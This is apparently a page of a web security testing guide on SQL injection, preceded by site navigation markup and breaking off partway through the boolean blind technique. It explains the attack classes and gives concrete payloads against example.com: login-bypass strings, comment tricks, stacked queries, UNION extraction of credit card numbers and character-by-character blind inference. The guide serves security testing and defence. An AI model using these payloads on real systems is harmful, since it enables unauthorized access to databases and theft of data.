+</li>
+<li class="wstg-nav-item" data-title="4.10.8 Test Upload of Unexpected File Types" data-hints="wstg-busl-08 busl-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types" title="4.10.8 Test Upload of Unexpected File Types">4.10.8 Test Upload of Unexpected File Types</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.9 Test Upload of Malicious Files" data-hints="wstg-busl-09 busl-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" title="4.10.9 Test Upload of Malicious Files">4.10.9 Test Upload of Malicious Files</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.11 Client-side Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/" title="4.11 Client-side Testing">4.11 Client-side Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.11.1 Testing for DOM-Based Cross Site Scripting" data-hints="xss dom xss domxss wstg-clnt-01 clnt-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting" title="4.11.1 Testing for DOM-Based Cross Site Scripting">4.11.1 Testing for DOM-Based Cross Site Scripting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.2 Testing for JavaScript Execution" data-hints="wstg-clnt-02 clnt-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution" title="4.11.2 Testing for JavaScript Execution">4.11.2 Testing for JavaScript Execution</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.3 Testing for HTML Injection" data-hints="wstg-clnt-03 clnt-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" title="4.11.3 Testing for HTML Injection">4.11.3 Testing for HTML Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.4 Testing for Client-side URL Redirect" data-hints="open redirect wstg-clnt-04 clnt-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" title="4.11.4 Testing for Client-side URL Redirect">4.11.4 Testing for Client-side URL Redirect</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.5 Testing for CSS Injection" data-hints="wstg-clnt-05 clnt-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection" title="4.11.5 Testing for CSS Injection">4.11.5 Testing for CSS Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.6 Testing for Client-side Resource Manipulation" data-hints="wstg-clnt-06 clnt-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation" title="4.11.6 Testing for Client-side Resource Manipulation">4.11.6 Testing for Client-side Resource Manipulation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.7 Testing Cross Origin Resource Sharing" data-hints="cors headers wstg-clnt-07 clnt-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing" title="4.11.7 Testing Cross Origin Resource Sharing">4.11.7 Testing Cross Origin Resource Sharing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.8 Testing for Cross Site Flashing" data-hints="wstg-clnt-08 clnt-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing" title="4.11.8 Testing for Cross Site Flashing">4.11.8 Testing for Cross Site Flashing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.9 Testing for Clickjacking" data-hints="ui redress ui redressing x-frame-options framing wstg-clnt-09 clnt-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" title="4.11.9 Testing for Clickjacking">4.11.9 Testing for Clickjacking</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.10 Testing WebSockets" data-hints="ws wstg-clnt-10 clnt-10">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" title="4.11.10 Testing WebSockets">4.11.10 Testing WebSockets</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.11 Testing Web Messaging" data-hints="postmessage post message wstg-clnt-11 clnt-11">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging" title="4.11.11 Testing Web Messaging">4.11.11 Testing Web Messaging</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.12 Testing Browser Storage" data-hints="localstorage sessionstorage wstg-clnt-12 clnt-12">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" title="4.11.12 Testing Browser Storage">4.11.12 Testing Browser Storage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.13 Testing for Cross Site Script Inclusion" data-hints="xssi wstg-clnt-13 clnt-13">
+<a href="/v4.2/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion" title="4.11.13 Testing for Cross Site Script Inclusion">4.11.13 Testing for Cross Site Script Inclusion</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.12 API Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/12-API_Testing/" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/" title="4.12 API Testing">4.12 API Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.12.1 Testing GraphQL" data-hints="gql wstg-apit-01 apit-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL" title="4.12.1 Testing GraphQL">4.12.1 Testing GraphQL</a>
+</li>
+</ul>
+</details>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="5. Reporting">
+<a href="/v4.2/5-Reporting/" data-nav-url="5-Reporting/" title="5. Reporting">5. Reporting</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix A. Testing Tools Resource">
+<a href="/v4.2/6-Appendix/A-Testing_Tools_Resource" data-nav-url="6-Appendix/A-Testing_Tools_Resource" title="Appendix A. Testing Tools Resource">Appendix A. Testing Tools Resource</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix B. Suggested Reading">
+<a href="/v4.2/6-Appendix/B-Suggested_Reading" data-nav-url="6-Appendix/B-Suggested_Reading" title="Appendix B. Suggested Reading">Appendix B. Suggested Reading</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix C. Fuzz Vectors">
+<a href="/v4.2/6-Appendix/C-Fuzz_Vectors" data-nav-url="6-Appendix/C-Fuzz_Vectors" title="Appendix C. Fuzz Vectors">Appendix C. Fuzz Vectors</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix D. Encoded Injection">
+<a href="/v4.2/6-Appendix/D-Encoded_Injection" data-nav-url="6-Appendix/D-Encoded_Injection" title="Appendix D. Encoded Injection">Appendix D. Encoded Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix E. History">
+<a href="/v4.2/6-Appendix/E-History" data-nav-url="6-Appendix/E-History" title="Appendix E. History">Appendix E. History</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix F. Leveraging Dev Tools">
+<a href="/v4.2/6-Appendix/F-Leveraging_Dev_Tools" data-nav-url="6-Appendix/F-Leveraging_Dev_Tools" title="Appendix F. Leveraging Dev Tools">Appendix F. Leveraging Dev Tools</a>
+</li>
+
+  </ul>
+</nav>
+<script src="/assets/js/wstg-nav.js" defer></script>
+<script src="/assets/js/anchor-links.js" defer></script>
+
+      </aside>
+      <article class="doc-content">
+        <h1 id="testing-for-sql-injection">Testing for SQL Injection</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>ID</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>WSTG-INPV-05</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>SQL injection testing checks if it is possible to inject data into the application so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. A successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database.</p>
+
+<p>An <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL injection</a> attack consists of insertion or “injection” of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.</p>
+
+<p>In general the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:</p>
+
+<p><code class="language-plaintext highlighter-rouge">select title, text from news where id=$id</code></p>
+
+<p>In the example above the variable <code class="language-plaintext highlighter-rouge">$id</code> contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.</p>
+
+<p>Because the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user’s choice. The example below illustrates the user-supplied data “10 or 1=1”, changing the logic of the SQL statement, modifying the WHERE clause adding a condition “or 1=1”.</p>
+
+<p><code class="language-plaintext highlighter-rouge">select title, text from news where id=10 or 1=1</code></p>
+
+<p>SQL Injection attacks can be divided into the following three classes:</p>
+
+<ul>
+  <li>Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.</li>
+  <li>Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).</li>
+  <li>Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.</li>
+</ul>
+
+<p>A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.</p>
+
+<p>About the techniques to exploit SQL injection flaws there are five commons techniques. Also those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):</p>
+
+<ul>
+  <li>Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.</li>
+  <li>Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.</li>
+  <li>Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.</li>
+  <li>Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).</li>
+  <li>Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.</li>
+</ul>
+
+<h2 id="test-objectives">Test Objectives</h2>
+
+<ul>
+  <li>Identify SQL injection points.</li>
+  <li>Assess the severity of the injection and the level of access that can be achieved through it.</li>
+</ul>
+
+<h2 id="how-to-test">How to Test</h2>
+
+<h3 id="detection-techniques">Detection Techniques</h3>
+
+<p>The first step in this test is to understand when the application interacts with a DB Server in order to access some data. Typical examples of cases when an application needs to talk to a DB include:</p>
+
+<ul>
+  <li>Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).</li>
+  <li>Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.</li>
+  <li>E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.</li>
+</ul>
+
+<p>The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.</p>
+
+<p>The very first test usually consists of adding a single quote <code class="language-plaintext highlighter-rouge">'</code> or a semicolon <code class="language-plaintext highlighter-rouge">;</code> to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):</p>
+
+<pre><code class="language-asp">Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
+character string ''.
+/target/target.asp, line 113
+</code></pre>
+
+<p>Also comment delimiters (<code class="language-plaintext highlighter-rouge">--</code> or <code class="language-plaintext highlighter-rouge">/* */</code>, etc) and other SQL keywords like <code class="language-plaintext highlighter-rouge">AND</code> and <code class="language-plaintext highlighter-rouge">OR</code> can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:</p>
+
+<pre><code class="language-asp">Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
+varchar value 'test' to a column of data type int.
+/target/target.asp, line 113
+</code></pre>
+
+<p>Monitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester in order to mount a successful injection attack. However, applications often do not provide so much detail: a simple ‘500 Server Error’ or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the other remain constant, in order to precisely understand which parameters are vulnerable and which are not.</p>
+
+<h3 id="standard-sql-injection-testing">Standard SQL Injection Testing</h3>
+
+<h4 id="classic-sql-injection">Classic SQL Injection</h4>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE Username='$username' AND Password='$password'</code></p>
+
+<p>A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">$password = 1' or '1' = '1</code></p>
+
+<p>The query will be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'</code></p>
+
+<p>If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable web site is www.example.com, the request that we’ll carry out will be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;amp;password=1'%20or%20'1'%20=%20'1</code></p>
+
+<p>After a short analysis we notice that the query returns a value (or a set of values) because the condition is always true (OR 1=1). In this way the system has authenticated the user without knowing the username and password.</p>
+
+<blockquote>
+  <p>In some systems the first row of a user table would be an administrator user. This may be the profile returned in some cases.</p>
+</blockquote>
+
+<p>Another example of query is the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))</code></p>
+
+<p>In this case, there are two problems, one due to the use of the parentheses and one due to the use of MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding a number of closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol to the greater majority of the databases is <code class="language-plaintext highlighter-rouge">*</code>. In Oracle the symbol is <code class="language-plaintext highlighter-rouge">--</code>. This said, the values that we’ll use as Username and Password are:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1'))/*</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">$password = foo</code></p>
+
+<p>In this way, we’ll get the following query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))</code></p>
+
+<p>(Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.)</p>
+
+<p>The URL request will be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;amp;password=foo</code></p>
+
+<p>This may return a number of values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). In order to go around this problem, it is enough to insert a SQL command that imposes a condition that the number of the returned results must be one. (One record returned) In order to reach this goal, we use the operator <code class="language-plaintext highlighter-rouge">LIMIT &lt;num&gt;</code>, where <code class="language-plaintext highlighter-rouge">&lt;num&gt;</code> is the number of the results/records that we want to be returned. With respect to the previous example, the value of the fields Username and Password will be modified as follows:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$username = 1' or '1' = '1')) LIMIT 1/*</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">$password = foo</code></p>
+
+<p>In this way, we create a request like the follow:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;amp;password=foo</code></p>
+
+<h4 id="select-statement">SELECT Statement</h4>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
+
+<p>Consider also the request to a script who executes the query above:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10</code></p>
+
+<p>When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is play with logic, using the operators AND and OR.</p>
+
+<p>Consider the request:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND 1=2</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=10 AND 1=2</code></p>
+
+<p>In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 AND 1=1</code></p>
+
+<h4 id="stacked-queries">Stacked Queries</h4>
+
+<p>Depending on the API which the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.</p>
+
+<p>Consider the following SQL query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE id_product=$id_product</code></p>
+
+<p>A way to exploit the above scenario would be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10; INSERT INTO users (…)</code></p>
+
+<p>This way is possible to execute many queries in a row and independent of the first query.</p>
+
+<h3 id="fingerprinting-the-database">Fingerprinting the Database</h3>
+
+<p>Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, functions to retrieve data such as users names and databases, features, comments line etc.</p>
+
+<p>When the testers move to a more advanced SQL injection exploitation they need to know what the back end database is.</p>
+
+<h4 id="errors-returned-by-the-application">Errors Returned by the Application</h4>
+
+<p>The first way to find out what back end database is used is by observing the error returned by the application. The following are some examples of error messages:</p>
+
+<p>MySql:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the
+right syntax to use near '\'' at line 1
+</code></pre></div></div>
+
+<p>One complete UNION SELECT with version() can also help to know the back end database.</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1</code></p>
+
+<p>Oracle:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ORA-00933: SQL command not properly ended</code></p>
+
+<p>MS SQL Server:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft SQL Native Client error ‘80040e14’
+Unclosed quotation mark after the character string
+
+SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
+</code></pre></div></div>
+
+<p>PostgreSQL:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Query failed: ERROR: syntax error at or near
+"’" at character 56 in /www/site/test.php on line 121.
+</code></pre></div></div>
+
+<p>If there is no error message or a custom error message, the tester can try to inject into string fields using varying concatenation techniques:</p>
+
+<ul>
+  <li>MySql: ‘test’ + ‘ing’</li>
+  <li>SQL Server: ‘test’ ‘ing’</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>Oracle: ‘test’</td>
+          <td> </td>
+          <td>’ing’</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>PostgreSQL: ‘test’</td>
+          <td> </td>
+          <td>’ing’</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<h3 id="exploitation-techniques">Exploitation Techniques</h3>
+
+<h4 id="union-exploitation-technique">Union Exploitation Technique</h4>
+
+<p>The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose for our examples that the query executed from the server is the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT Name, Phone, Address FROM Users WHERE Id=$id</code></p>
+
+<p>We will set the following <code class="language-plaintext highlighter-rouge">$id</code> value:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></p>
+
+<p>We will have the following query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></p>
+
+<p>Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword <code class="language-plaintext highlighter-rouge">ALL</code> is necessary to get around queries that use the keyword <code class="language-plaintext highlighter-rouge">DISTINCT</code>. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns in order to avoid a syntax error.</p>
+
+<p>The first detail a tester needs to exploit the SQL injection vulnerability using such technique is to find the right numbers of columns in the SELECT statement.</p>
+
+<p>In order to achieve this the tester can use <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause followed by a number indicating the numeration of database’s column selected:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 ORDER BY 10--</code></p>
+
+<p>If the query executes with success the tester can assume, in this example, there are 10 or more columns in the <code class="language-plaintext highlighter-rouge">SELECT</code> statement. If the query fails then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Unknown column '10' in 'order clause'</code></p>
+
+<p>After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--</code></p>
+
+<p>If the query fails, the tester will probably see a message like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">All cells in a column must have the same datatype</code></p>
+
+<p>If the query executes with success, the first column can be an integer. Then the tester can move further and so on:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--</code></p>
+
+<p>After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a <code class="language-plaintext highlighter-rouge">LIMIT</code> clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database which ID is 99999):</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--</code></p>
+
+<h4 id="boolean-exploitation-technique">Boolean Exploitation Technique</h4>
+
+<p>The Boolean exploitation technique is very useful when the tester finds a <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a> situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).</p>
+
+<p>By using inference methods, it is possible to avoid this obstacle and thus to succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named <code class="language-plaintext highlighter-rouge">id</code> vulnerable to SQL injection. This means that carrying out the following request:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://www.example.com/index.php?id=1'</code></p>
+
+<p>We will get one page with a custom message error which is due to a syntactic error in the query. We suppose that the query executed on the server is:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='$Id'</code></p>
+
+<p>Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our examples, we will use the following pseudo-functions:</p>
+
+<ul>
+  <li>
+    <p>SUBSTRING (text, start, length): returns a substring starting from the position “start” of text and of length “length”. If “start” is greater than the length of text, the function returns a null value.</p>
+  </li>
+  <li>
+    <p>ASCII (char): it gives back ASCII value of the input character. A null value is returned if char is 0.</p>
+  </li>
+  <li>
+    <p>LENGTH (text): it gives back the number of characters in the input text.</p>
+  </li>
+</ul>
+
+<p>Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, in order to select only one character at a time (selecting a single character means to impose the length parameter to 1), and the function ASCII, in order to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table, until the right value is found. As an example, we will use the following value for <code class="language-plaintext highlighter-rouge">Id</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1</code></p>
+
+<p>That creates the following query (from now on, we will call it “inferential query”):</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'</code></p>
+
+<p>The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for <code class="language-plaintext highlighter-rouge">Id</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$Id=1' AND '1' = '2</code></p>
+
+<p>Which will create the following query:</p>
+
+<p><code class="language-plaintext highlighter-rouge">SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'</code></p>
+
+<p>The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and to obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates in order to decide the result of the test.</p>
+
+<p>In the previous discussion, we haven’t dealt with the problem of determining the termination condition for out tests, i.e., when we should end the inference procedure. A techniques to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e., the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.</p>
+
+<p>We will insert the following value for the field <code class="language-plaintext highlighter-rouge">Id</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$Id=1' AND LENGTH(username)=N AND '1' = '1</code></p>
+
+<p>Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:</p>
+
